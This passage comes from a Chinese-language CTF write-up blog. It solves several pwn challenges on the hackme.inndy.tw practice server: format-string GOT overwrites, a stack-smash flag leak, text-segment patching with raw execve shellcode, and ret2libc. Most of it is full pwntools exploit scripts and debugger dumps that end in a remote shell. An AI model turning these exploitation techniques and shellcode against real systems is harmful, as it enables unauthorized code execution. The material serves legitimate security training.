(_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d204616:0058│ 0xffffcd58 —▸ 0xf7ed62ac (__close_nocancel+18) ◂— mov ebx, edx17:005c│ 0xffffcd5c —▸ 0x804874a (main+187) ◂— add esp, 0x1018:0060│ 0xffffcd60 ◂— 0x319:0064│ 0xffffcd64 —▸ 0x804a060 (magic) ◂— 0xbd5d20461a:0068│ 0xffffcd68 ◂— 0x41b:006c│ 0xffffcd6c —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1c:0070│ 0xffffcd70 ◂— 0x80001d:0074│ 0xffffcd74 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)20:0080│ 0xffffcd80 ◂— 0x1... ↓22:0088│ 0xffffcd88 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;23:008c│ 0xffffcd8c ◂— 0x324:0090│ 0xffffcd90 ◂— 0x25d832425:0094│ 0xffffcd94 ◂— 0xdddfa71b26:0098│ 0xffffcd98 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;27:009c│ 0xffffcd9c ◂— 0xc7e69f0028:00a0│ 0xffffcda0 —▸ 0xffffcdc0 ◂— 0x129:00a4│ 0xffffcda4 ◂— 0x0... ↓2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x102c:00b0│ 0xffffcdb0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2e:00b8│ 0xffffcdb8 ◂— 0x02f:00bc│ 0xffffcdbc —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1030:00c0│ 0xffffcdc0 ◂— 0x131:00c4│ 0xffffcdc4 —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;) 这里就以0x20的栈帧进行分析了，可以发现几个有用的地址 123456714:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d2046...1e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)...2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x10 偏移分别 为20,21,30,31,43，(这里规定它们分别为fmt20,fmt21,ebp1,ebp2) 而且偏移43处放着的是libc_start_main+247的地址，它的偏移是不变的，所以就可以用来做爆破的标志，来找到我们要的栈帧（exa = 0x20的栈帧） 123456789while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close() 爆破完成之后就可以进行正常的操作了思路如下 ： 通过libc_start_main算出偏移，进而得到system的真实地址 %n操作 30，10偏移处使ebp1指向fmt20，ebp2指向fmt21 %n操作 ebp1使fmt20的内容修改为exit_got 操作 ebp2 使fmt21的内容修改为exit_got+2 %n操作 fmt20 修改exit_got 为system低4位，操作 fmt21 修改exit_got+2为system高4位 发送&#39;/bin/sh&#39;作为system函数的参数 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'elf = ELF('./echo3')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close()libc_start_main = int(data[:-1],16)-247ebp1 = int(p.recv()[:-1],16) #在偏移为 31 (ebp1的偏移为87)print 'libc_start_main--&gt;' + hex(libc_start_main)print 'ebp1--&gt;' + hex(ebp1)fmt20 = ebp1-0x10cfmt21 = ebp1-0x108offset = libc_start_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)print 'libc_system--&gt;' + hex(libc.symbols['system'])pause()# exit_got = elf.got['exit']# print 'exit_got--&gt;' + hex(exit_got)printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)#%n操作 30,31偏移处使ebp1指向 fmt20 ebp2指向 fmt21payload_1 = '%'+str(fmt20&amp;0xffff)+'c%30$hn'payload_1 += '%4c%31$hn'payload_1 += '1111'# gdb.attach(p,"b *0x08048646")# pause()p.sendline(payload_1)#%n操作 ebp1使fmt20内容修改为exit_got,操作 ebp2使fmt21内容修改为exit_got+2payload_2 = '%'+str(printf_got&amp;0xffff)+'c%85$hn'payload_2 += '%2c%87$hn'payload_2 += '2222'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('1111\n')p.sendline(payload_2)#%n操作 fmt20修改exit_got为system低4位 fmt21修改为exit_got+2为system高4位payload_3 = '%'+str((system_addr&gt;&gt;16)&amp;0xff)+'c%20$hhn'payload_3 += '%'+str((system_addr&amp;0xffff)-((system_addr&gt;&gt;16)&amp;0xff))+'c%21$hn' payload_3 += '3333'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('2222\n')p.sendline(payload_3)p.recv()p.recvuntil('3333\n')p.send('/bin/sh\x00')p.interactive() smash-the-stack这题是利用ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：Stack smash 只要将argv[0]覆盖为存放flag的地址即可，在write处下断查看argvp[0]的偏移 1234567891011121314151617181920212223pwndbg&gt; stack 2000:0000│ esp 0xffffcd70 ◂— 0x101:0004│ 0xffffcd74 —▸ 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)02:0008│ 0xffffcd78 ◂— &apos;1111&apos;03:000c│ 0xffffcd7c ◂— 0x004:0010│ 0xffffcd80 ◂— 0x105:0014│ 0xffffcd84 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)06:0018│ ebx ecx 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)07:001c│ 0xffffcd8c ◂— 0xc7f80a3208:0020│ 0xffffcd90 —▸ 0xffffcdb0 ◂— 0x109:0024│ 0xffffcd94 ◂— 0x0... ↓0b:002c│ 0xffffcd9c —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffffcda0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffffcda8 ◂— 0x00f:003c│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffffcdb0 ◂— 0x111:0044│ 0xffffcdb4 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)12:0048│ 0xffffcdb8 —▸ 0xffffce4c —▸ 0xffffd084 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;13:004c│ 0xffffcdbc ◂— 0x0pwndbg&gt; distance 0xffffce44 0xffffcd880xffffce44-&gt;0xffffcd88 is -0xbc bytes (-0x2f words) exp: 123456789from pwn import *context.log_level = 'debug'# p = process('./smash')p = remote('hackme.inndy.tw',7717)flag_addr = 0x804A060p.recvuntil('the flag')p.sendline(47*'a'+p32(flag_addr))# p.sendline(48*p32(flag_addr))p.interactive() 还有另一种做法就是不用算偏移，直接塞一大把p32(flag_addr)进去，因为只要覆盖到argv[0]的位置就可以了，但是实践表明，如果这个数差偏移太多的话，也是不太行的。（比如上面的塞100个在本地还是可以的，但是远程的话63个以上就已经不正常了，我猜是覆盖到了___stack_chk_fail函数部分导致函数无法正常执行，也就不存在通过___stack_chk_fail函数打印出flag了） onepunch这道题还是挺有趣的，起初看反编译代码不是很理解 v6 跟v4的关系，但是在汇编中就很直观了，v6是地址，v4是写入的内容，也就是任意地址写 还有就是这个程序的text段居然是可写的，结合上面的任意地址写就意味着我们可以修改程序的逻辑实现各种操作，相当于打patch 再看一下main函数：这里对输入的v4进行判断，如果不等于255就跳到400773处，所以我们只需要在这里打patch使其跳到main函数就可以实现无限输入。 1234567.text:0000000000400756 mov rax, [rbp+v6].text:000000000040075A mov edx, [rbp+v4].text:000000000040075D mov [rax], dl.text:000000000040075F ; 14: if ( v4 == 255 ).text:000000000040075F mov eax, [rbp+v4].text:0000000000400762 cmp eax, 0FFh.text:0000000000400767 jnz short loc_400773 这里就需要修改16进制了，IDA-&gt;options 将Number of opcode bytes(non-graph)的值设为16就可以看到汇编对应的16进制数。接下来算偏移，要从0x400769跳跟0x4006f1偏移应该为0x88 = 136，所以第一步就是将0x400768处的0xA修改为0x88 123456p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138') 接下来往text段写入shellcode，写完后再修改0x400768处为shellcode地址即可 完整exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *# p = process('./onepunch')p = remote("hackme.inndy.tw","7718")context.log_level = 'debug'p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138')shell_addr = 0x400790# shellcode = asm(shellcraft.sh())shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" shell_len = len(shellcode)i = 0while i&lt;shell_len: p.recvuntil('Where What?') p.sendline(str(hex(shell_addr+i))) # sleep(0.1) p.sendline(str(ord(shellcode[i]))) i += 1p.recvuntil('Where What?')p.sendline('0x400768')# sleep(0.1)p.sendline('39')p.interactive() tictactoe-1 每次可以写入一个字节，所以就很容易可以想到，把puts的got表修改成0x08048C46(cat flag的位置)，就可以拿到flag_simple了 exp: 123456789101112131415161718192021222324252627282930313233#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./tictactoe')p = remote("hackme.inndy.tw","7714")puts_got = 0x804B024# -50distance_addr = 0x8048C46p.recvuntil('Play (1)st or (2)nd? ')p.sendline('1')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x46')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-50')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x8c')p.recvuntil('Input move (9 to change flavor): ')# gdb.attach(p,"b *0x08048A71")# pause()p.sendline('-49')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x04')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-48')p.interactive() rsbo-2 栈溢出漏洞，程序中又有write函数，所以其实很清晰了，利用write函数泄漏出read的真实地址进而得到system的真实地址再跳转到去就可以get shell 了，但是这里有一个坑需要说一下，就是垃圾字符要用\x00去填充而不是用’a’啊啥的这些 因为len(buf)在栈中的位置跟buf的重叠的，所以当我们有字母去填充时，会导致 v8的值出错，这样程序就会崩溃退出 用\x00填的时候才会正常，接下来的操作不用多说了 exp: 12345678910111213141516171819202122232425262728293031323334353637#-*-coding:utf-8-*-# get shell 脚本from pwn import *# p = process('./rsbo')p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'main = 0x804867Fread_plt = elf.plt['read']read_got = elf.got['read']open_plt = elf.plt['open']write_plt = elf.plt['write']bss = elf.bss()# write(1,read_got,4)payload_2 = p32(0)*27 + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)print hex(len(payload_2))# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_2)read_addr = u32(p.recv(4))print "read_addr --&gt; " + hex(read_addr)offset = read_addr - libc.symbols['read']system_addr = offset + libc.symbols['system']bin_libc = libc.search("/bin/sh").next()bin_addr = bin_libc + offsetprint "system_addr --&gt; " + hex(system_addr)print "bin_addr --&gt; " + hex(bin_addr)# pause()# 回到 mainpayload_3 = p32(0)*25 + p32(system_addr) + p32(0) + p32(bin_addr)# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_3)p.interactive() rsbo1其实我是用的rsbo2的脚本直接拿到两题的flag再回过头来用open的方法做rsbo1，因为我一直在纳闷open返回的指针怎么获取给read用，但是后来问了师兄才知道了read的第一个参数的妙处： 关于read的第一个参数read(fd,buf,size) 为0时表示标准输入流（键盘)，为1时表示标准输出流（屏幕）(1一般是用在write吧)，为2时表示错误信息输出，为3之后表示文件流依次表示第一个open的文件第二个，第三个…….（如果同时打开多个文件的话） 所以open(“/home/ctf/flag”)后可以直接调用read(3,bss,0x60)再write就可以把flag打印出来的 还有个坑，在open这里虽然它只需要一个参数，但是它并不只有一个参数，我们要保证它的其实参数为0才能正常调用 exp: 1234567891011121314151617181920212223242526272829303132333435#-*-coding:utf-8from pwn import *context.log_level = 'debug'p = process('./rsbo')# p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')open_plt = elf.plt['open']read_plt = elf.plt['read']write_plt = elf.plt['write']main = 0x804867Fstart = 0x08048490flag_addr = 0x80487D0bss = elf.bss()# fd = open("/home/ctf/flag")# read(fd,buf,0x10)# write(1,buf,0x10)#open("/home/ctf/flag")payload_1 = p32(0)*27 + p32(open_plt) + p32(start) + p32(flag_addr) + p32(0)gdb.attach(p,"b *0x804867D")pause()p.send(payload_1)#read(fd,buf,0x10)payload_2 = p32(0)*27 + p32(read_plt) + p32(start)payload_2 += p32(0x3) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_2)#write(1,buf,0x10)payload_3 = p32(0)*27 + p32(write_plt) + p32(0)payload_3 += p32(1) + p32(bss) + p32(0x60)# gdb.attach(p,"b *0x804867D")# pause()p.send(payload_3)p.interactive() stack这题还是挺有意思的，程序主要做的事就是模拟一个栈的push，pop操作，并将自己模拟的栈放在函数栈帧中， 上图为栈的分布，我们可以看到，自己构造的esp也同样放在栈中，那么我们就可以通过pop,push操作控制esp的位置实现任意地址读，写，思路如下 ： 将esp指向esp所以在位置的上方，push写入改变esp指向libc_start_main+247的位置 pop出libc_start_main+247的值，利用偏移算出system及&quot;/bin/sh&quot;的真实地址 继续控制esp指向main的ret地址位置，修改为system的地址，以及参数&quot;/bin/sh&quot; x 退出即可get shell 好了，接下来详细讲一下过程以及上图是怎么来的 这是IDA反编译出来的东西，我看着是看不出什么有用的信息的，建议看汇编，如果单纯汇编很难看懂的话，可以跟着gdb一步步调试来理解，那我们看汇编 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950.text:000006F0 public stack_push.text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p.text:000006F0.text:000006F0 arg_0 = dword ptr 8.text:000006F0 arg_4 = dword ptr 0Ch.text:000006F0.text:000006F0 ; __unwind &#123; .text:000006F0 push ebp.text:000006F1 mov ebp, esp.text:000006F3 ; 4: result = *a1;.text:000006F3 call __x86_get_pc_thunk_ax.text:000006F8 add eax, 18C8h.text:000006FD mov eax, [ebp+arg_0].text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000702 ; 5: *a1 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[-254] + 1;.text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax].text:00000705 mov edx, [ebp+arg_0].text:00000708 mov [edx], ecx.text:0000070A ; 6: a1[result + 1] = a2;.text:0000070A mov edx, [ebp+arg_0].text:0000070D mov ecx, [ebp+arg_4].text:00000710 mov [edx+eax*4+4], ecx.text:00000714 ; 7: return result;.text:00000714 nop.text:00000715 pop ebp.text:00000716 retn----------------------------------------------------------------------------------------------.text:00000717 public stack_pop.text:00000717 stack_pop proc near ; CODE XREF: main+10C↓p.text:00000717.text:00000717 arg_0 = dword ptr 8.text:00000717.text:00000717 ; __unwind &#123;.text:00000717 push ebp.text:00000718 mov ebp, esp.text:0000071A call __x86_get_pc_thunk_ax.text:0000071F add eax, 18A1h.text:00000724 mov eax, [ebp+arg_0].text:00000727 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000729 lea edx, (unk_1FBF - 1FC0h)[eax].text:0000072C mov eax, [ebp+arg_0].text:0000072F mov ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax], edx.text:00000731 mov eax, [ebp+arg_0].text:00000734 mov edx, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax].text:00000736 mov eax, [ebp+arg_0].text:00000739 mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4].text:0000073D pop ebp.text:0000073E retn.text:0000073E ; &#125; // starts at 717.text:0000073E stack_pop endp 可以看到，在进行push操作的时候mov [edx+eax*4+4], ecx是与ecx有关，pop的时候mov eax, ds:(dword_1FC4 - 1FC0h)[eax+edx*4]也是跟exc有关，到gdb里看一波 可以看到ecx存的是push的值（我输入的是123=0x7b）eax是与ebp的偏移（将初始esp看成ebp吧），edx是ebp，这里应该就能看出一开始给的图的上半部分了吧 单步一下可以看到我们push的值已经入栈，push的操作明白了我们来看一下pop的操作 因为我们已经先push一个0x7b，所以这次pop指向的就是0xffffcc4c处的0x7b并且esp更新为0(-1)，这就是pop的过程，理清这两个过程就可以来实现上面的4个思路了 首先要修改esp的值就是先将esp指向esp的上方，即0xffffcc44处，初始esp是指向0xffffcc48，所以只需要pop一下就可以了，然后就是修改esp的值 ，用push，修改为多少呢 修改esp指向libc_start_main的位置，也就是0x59 = 89，之后再用pop将地址泄漏出来，进而算出偏移，得到system跟&#39;/bin/sh&#39;的地址，得到地址之后就要找到main函数的返回地址，覆盖为system 我们再往下看多一点栈的内容，回到main，在0x8fb处下个断点，单步往下 看到这个栈帧是不是很熟悉，继续单步到ret处查看栈 对比一下可以很清楚的发现main函数的返回地址是第二个的libc_start_main而不是我们用来泄漏地址的位置，这就是一开始那张图的下半部分了，好了，那开始覆盖：将0xffffcdbc覆盖为system_addr，将0xffffcdc4覆盖为binsh_addr 写入的时候用还是跟泄漏地址时一样的做法，先将esp指向其上方，然后用push压入相应值 不过这里要注意的是，scanf的格式化字符是%d，它能接收的最大值是0x7fffffff而我们要写入的真实地址都是0xf7开头的，明显太大，所以我们要用负数去写，0xffffffff == -1，0xfffffffe == -2这样子就能写入我们要的真实地址了 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#-*-coding:utf-8-*-from pwn import *# p = process('./stack')p = remote("hackme.inndy.tw","7716")elf = ELF('./stack')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 泄漏libc_start_mainp.sendline('i\n89')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Pop -&gt; ')libc_main_addr = (int(p.recvuntil('\n')[:-1],10)&amp;0xffffffff)-247offset = libc_main_addr - libc.symbols['__libc_start_main']system_libc = libc.symbols['system']binsh_libc = libc.search("/bin/sh").next()system_addr = system_libc + offsetbinsh_addr = binsh_libc + offsetlog.info("libc_main_addr --&gt; &#123;&#125;".format(hex(libc_main_addr)))log.info("offset --&gt; &#123;&#125;".format(hex(offset)))log.info("system_addr --&gt; &#123;&#125;".format(hex(system_addr)))log.info("binsh_addr --&gt; &#123;&#125;".format(hex(binsh_addr)))pause()p.recvuntil('Cmd &gt;&gt;\n')p.sendline('c')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')# 写入binshp.sendline('i\n94')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_binsh = 0xffffffff - binsh_addr+1payload = '-' + str(push_binsh)print payloadp.sendline(payload)# 写入system_addrfor i in range(3): p.recvuntil('Cmd &gt;&gt;\n') p.sendline('p')p.recvuntil('Cmd &gt;&gt;\n')p.sendline('i')push_system = 0xffffffff - system_addr + 1payload = '-' + str(push_system)p.sendline(payload)p.recvuntil('Cmd &gt;&gt;\n')p.sendline('x')p.interactive()]]></content>
  </entry>
</search>
